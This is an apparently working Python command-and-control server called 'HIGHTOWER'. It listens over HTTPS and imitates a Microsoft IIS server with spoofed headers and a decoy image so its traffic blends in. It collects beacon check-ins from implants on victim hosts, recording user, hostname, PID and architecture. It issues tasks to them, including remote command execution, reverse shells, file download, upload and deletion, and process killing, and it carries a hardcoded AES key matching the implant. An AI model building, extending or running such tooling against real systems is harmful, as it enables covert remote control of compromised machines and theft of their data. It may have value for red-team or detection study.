#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import logging
import json
import os
import threading
import time
from termcolor import colored
import ssl
import helpmenu

################## for aes testing
import hashlib

from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
import binascii
from binascii import unhexlify

class AesEncryption:

    def decrypt(enc):    
        # define the generated IV and KEY here (hardcoded in implant)
        key = unhexlify("b0ef0db4afc2a388e7fd4c40f1c90b07")
        IV = unhexlify("c2a55e988b042cd962c1f18b78538315") 
         
        cipher = AES.new(key, AES.MODE_CBC, IV)
        decrypt = cipher.decrypt(enc)
        return decrypt

####################

def buildResponse():

    json_response = {}
    json_response["type"] = "task_start"
    json_response["task_command"] = RequestHandler.command
    json_response["task_data"] = RequestHandler.data    
    json_dump = json.dumps(json_response)
    
    b64_response = base64.b64encode(json_dump.encode("utf-8"))

    return b64_response
 
class ServerValues:
    SRVPORT = ""
    SSL = True
    SSLCERT = 'localhost.pem'
    
class RequestHandler(BaseHTTPRequestHandler):

    # response headers    
    def _headers(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=UTF-8")
        self.send_header("X-Powered-By", "ASP.NET")
        self.end_headers()

    def do_POST(self):
        #print("\nConnection from: {} ".format(self.client_address[0]))
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        ######################## lets test aes decryption here
        """
        decrypted_data = AesEncryption.decrypt(post_data)
        #decrypted_data = unpad(AesEncryption.decrypt(post_data[AES.block_size:]), AES.block_size)
        
        print(type(decrypted_data))
        print(decrypted_data)
        print("\n\n\n")
        ########################
        """   
        data = base64.b64decode(post_data)          
        parse_data = json.loads(data.decode("utf-8"))
       
        if self.path.startswith("/finish"):                   
            print("\n" + parse_data["task_result"] + "\n")               
            RequestHandler.command = "empty_response"   
            
        if self.path.startswith("/update"):  
                                            
            data_response = buildResponse()   
                        
            self.wfile.write(data_response)          
            RequestHandler.recentUpdate = parse_data
         
            #RequestHandler.command = "empty_response"  

    def do_GET(self):
        self._headers()
        html_file = open("display.html", 'rb')
        message = html_file.read()
        
        if self.path == '/iisstart.png':
            self.send_response(200, "OK")
            self.send_header("Content-Type", "image/png")
            
            self.wfile.write(open('iisstart.png','rb').read())
            self.end_headers()
        
        self.end_headers()       
        self.wfile.write(message)
        
    def log_message(self, format, *args):
        return

def run(port):
    server = ('localhost', int(port))
    httpd = HTTPServer(server, RequestHandler)
    RequestHandler.server_version = "Microsoft-IIS/10.0"
    RequestHandler.sys_version = ""
    
    if ServerValues.SSL == True:
        httpd.socket = ssl.wrap_socket(httpd.socket,server_side=True,certfile=ServerValues.SSLCERT,ssl_version=ssl.PROTOCOL_TLS)
        
    httpd.serve_forever()
   
def checkCommandForInteraction(user_input):

    result = False

    commands_with_data = ["kill_pid", "exec_command", "find_files", "download_file", "upload_file", "delete_file", "rev_shell"]

    if user_input in commands_with_data:
        result = True
        
    return result
    
 
RequestHandler.recentUpdate = ""
  
   
def main():    
    
    # TODO - make another general class for storing variables
    # TODO - make a config class
    
    RequestHandler.command = "empty_response"
    RequestHandler.data = ""

    helpmenu.ascii_header()

    print("[+] Check the help menu with !help\n")
    thread = False
    
    while True:
        command = input('\n\033[91m' + "HIGHTOWER >> " + '\033[0m').lower()
        
        if (command == "!help"):
            helpmenu.help_menu()
           
        if (command.split(" ")[0] == "!issue"):
            RequestHandler.data = ""
            RequestHandler.command = command.split(" ")[1]  
                
            checkInteraction = checkCommandForInteraction(RequestHandler.command)
            if checkInteraction == True:  
                parsedData = command.split(" ")
                
                if RequestHandler.command == "exec_command":
                    RequestHandler.data = " ".join(parsedData[2:])
                else:
                    RequestHandler.data = parsedData[2]
                
                if RequestHandler.command == "upload_file":
                    with open(RequestHandler.data , "rb") as file:
                        file_data_encoded = base64.b64encode(file.read())
                        RequestHandler.data = file_data_encoded.decode("utf-8")  
                
            print("\033[32m[+] New task issued, waiting for response: \033[0m" + "\033[33m{} - {}\033[0m".format(RequestHandler.command, RequestHandler.data))
            
        if (command.split(" ")[0] == "!listen"):        
            ServerValues.SRVPORT = command.split(" ")[1]              
            thread = threading.Thread(target=run,name="t_server", args=(ServerValues.SRVPORT,))
            thread.daemon = True 
            thread.start()           
            print("\033[32m[+] Webserver running on: \033[0m" + "\033[33mhttps://127.0.0.1:{}\033[0m".format(ServerValues.SRVPORT))
            
        if (command == "!settings"):                
            if thread != False:
                thread_status = "Online"
            else:
                thread_status = "Offline"            
            #print("Server Port: {} \nServer Status: {}".format(port, thread_status))
        
            if ServerValues.SSL == True:
                cert = ServerValues.SSLCERT
                certEnable = "Enabled"
            else:
                cert = "Null"
                certEnable = "Disabled"    
        
            print("""   
        Name      Current Setting     Required    Description
        ----      ---------------     --------    -----------
        
        SRVPORT   \033[32m{:<15}\033[0m     yes         The local listening port
        SSL       \033[32m{:<15}\033[0m     yes         Use SSL/TLS for encrypted traffic
        SSLCERT   \033[32m{:<15}\033[0m     yes         Path to the self-generated SSL certificate
        STATUS    \033[32m{:<15}\033[0m                 Server listening status           
        """.format(ServerValues.SRVPORT, certEnable, cert, thread_status))
        
        if (command == "!clear"):
            os.system("cls||clear")   
        
        if (command == "!sessions"):
            if RequestHandler.recentUpdate:
                requestData = RequestHandler.recentUpdate
                print("""      
        Recent beacon check-ins
        =======================\n""")
            
            # fix this, format the output properly
            # we need to keep track of the last time of beaconing
                print("\t{:<22} {:<8} {:<14} {:<7}  {:<7}".format('ID', 'USER','HOSTNAME', 'PID','ARCH'))
                print("\t--                     ----     --------       ---      ----\n")
                print("\t{:<22} {:<8} {:<14} {:<7} {:<7}".format(requestData['id'], requestData['user'], requestData['hostname'], requestData['pid'], requestData['architecture']))
                

            # really, we want to issue commands based on unique ID when multiple hosts checkin
                # this requires uniq'ing the inbound beaconing requests by ID and display them in sessions
            else:
                print("[!] No recent beacon check-ins")

        #RequestHandler.data = ""
           
if __name__ == "__main__":
    main()